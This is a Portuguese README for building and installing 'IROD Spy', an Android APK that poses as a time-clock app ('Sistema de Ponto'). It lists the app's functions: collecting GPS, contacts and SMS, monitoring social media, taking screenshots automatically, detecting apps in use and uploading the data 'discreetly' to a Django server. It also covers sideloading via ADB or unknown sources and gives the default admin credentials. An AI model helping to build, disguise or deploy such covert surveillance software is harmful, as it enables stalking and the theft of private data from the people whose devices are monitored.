# 🚀 GERAR APK - IROD SPY (Windows)

## 📋 Opções de Build

### 🐳 **OPÇÃO 1: Docker (RECOMENDADO)**
Mais fácil e confiável no Windows.

#### Pré-requisitos:
1. **Docker Desktop**: https://www.docker.com/products/docker-desktop
2. **Git**: https://git-scm.com/download/win

#### Passos:
```bash
# 1. Abrir PowerShell/CMD como Administrador
# 2. Navegar para pasta do projeto
cd "C:\Users\Iuri\Desktop\Projetos\Monitoramento\Spy-mobile"

# 3. Executar script Docker
build-docker-windows.bat
```

---

### 🔧 **OPÇÃO 2: Build Nativo Windows**
Mais complexo, mas build direto no Windows.

#### Pré-requisitos:
1. **Python 3.8+**: https://www.python.org/downloads/
2. **Java JDK 11**: https://adoptium.net/
3. **Android SDK**: https://developer.android.com/studio#command-tools

#### Passos:
```bash
# 1. Configurar ambiente
setup-android-env.bat

# 2. Gerar APK
build-apk-windows.bat
```

---

## 📱 **Instalar APK no Dispositivo**

### Via ADB (USB):
```bash
# 1. Ativar "Depuração USB" no Android
# 2. Conectar dispositivo via USB
# 3. Instalar APK
adb install bin\irod-spy-debug.apk
```

### Via Arquivo:
1. Copiar APK da pasta `bin\` para o dispositivo
2. Instalar manualmente no Android
3. Permitir "Fontes desconhecidas" se necessário

---

## 🎯 **Arquivos Importantes**

- **main.py**: App principal Kivy
- **buildozer-social.spec**: Configuração de build
- **screenshot_utils.py**: Captura de tela
- **social_utils.py**: Monitoramento redes sociais

---

## ⚙️ **Configurações do APK**

- **Nome**: IROD Spy
- **Versão**: 1.0
- **Permissões**: GPS, Câmera, Contatos, SMS, Armazenamento
- **Target**: Android 11+ (API 30)

---

## 🔍 **Solução de Problemas**

### Build falha:
- Verificar conexão com internet
- Limpar cache: `rm -rf .buildozer bin`
- Verificar espaço em disco (mín. 5GB)

### APK não instala:
- Verificar "Fontes desconhecidas" habilitado
- Desinstalar versão anterior
- Verificar compatibilidade Android

---

## 📞 **Funcionalidades do APK**

✅ Interface "Sistema de Ponto"  
✅ Coleta GPS, contatos, SMS  
✅ Monitoramento redes sociais  
✅ Captura automática de screenshots  
✅ Upload discreto para servidor  
✅ Detecção de apps em uso  

---

## 🌐 **Servidor Django**

Certifique-se que o servidor Django está rodando:
```bash
cd "C:\Users\Iuri\Desktop\Projetos\Monitoramento\Spy"
python manage.py runserver 192.168.0.97:8000
```

**Login**: Admin / admin123